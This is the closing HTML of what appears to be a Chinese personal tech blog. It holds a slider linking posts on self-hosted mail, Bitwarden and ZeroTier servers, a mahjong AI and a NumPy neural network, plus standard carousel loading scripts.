class="blog-slider__code">2024-03-20</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/9930/&quot;);" href="javascript:void(0);" alt="">自建docker-mailserver邮件服务器</a><div class="blog-slider__text">用docker部署了个邮件服务器～</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/png/84f9ac75-6609-487a-9190-8b45a38064df.png);"><div class="blog-slider__content"><span class="blog-slider__code">2024-02-02</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/9235/&quot;);" href="javascript:void(0);" alt="">重塑密码管理体系——Bitwarden服务端自部署</a><div class="blog-slider__text">自部署一个密码管理平台</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://api.star-history.com/svg?repos=windshadow233/This-Repo-Has-0-Stars&amp;type=Date);"><div class="blog-slider__content"><span class="blog-slider__code">2024-02-23</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/9506/&quot;);" href="javascript:void(0);" alt="">一个随Star数动态变化的GitHub仓库</a><div class="blog-slider__text">一个有意思的GitHub仓库</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/webp/d5b9bb46-0e19-4831-933f-d99bd2380e5d.webp);"><div class="blog-slider__content"><span class="blog-slider__code">2023-09-14</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/8394/&quot;);" href="javascript:void(0);" alt="">从零开始的麻将AI论文复现（零）</a><div class="blog-slider__text">写了个麻将AI，不过暂时只实现了监督学习</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/png/5b4b7b2d-1c96-468f-876e-d5d1b5e24cef.png);"><div class="blog-slider__content"><span class="blog-slider__code">2022-05-13</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/7728/&quot;);" href="javascript:void(0);" alt="">自建一个ZeroTier行星/卫星服务器</a><div class="blog-slider__text">P2P异地组网神器——ZeroTier的自部署方法</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/jpeg/f17a1481-2a0e-404d-b6bb-5fa9a6006fb5.jpeg);"><div class="blog-slider__content"><span class="blog-slider__code">2021-08-06</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/6263/&quot;);" href="javascript:void(0);" alt="">手搓神经网络系列之——训练模型（完结篇）</a><div class="blog-slider__text">用Numpy撸了个神经网络</div></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms; background: url(https://blogfiles.oss.fyz666.xyz/png/ea524747-7787-48e0-8d51-c8d7ee7f9226.png);"><div class="blog-slider__content"><span class="blog-slider__code">2021-08-11</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;/blog/6304/&quot;);" href="javascript:void(0);" alt="">如何在校外使用北邮人PT站</a><div class="blog-slider__text">完美解决离校后无法使用北邮人PT站的问题</div></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>')}}for(var elist="undefined".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_swiper_injector_config()</script><script defer src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/swiper.min.js"></script><script defer data-pjax src="https://fastly.jsdelivr.net/gh/windshadow233/BlogStorage@files/js/swiper_init.js"></script></body></html>